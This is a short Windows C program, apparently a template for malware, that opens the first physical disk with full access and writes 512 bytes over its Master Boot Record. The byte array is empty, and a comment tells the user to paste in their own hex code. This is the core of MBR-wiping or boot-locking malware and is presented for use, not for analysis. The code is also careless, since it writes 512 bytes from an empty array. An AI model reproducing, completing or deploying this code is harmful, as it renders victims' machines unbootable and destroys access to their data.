#include <windows.h>


const unsigned char MasterBootRecord[] = {}; //here enter you Hexadecimal code in midle of {};

int CALLBACK WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine, int       nCmdShow
)
{
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);

    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}
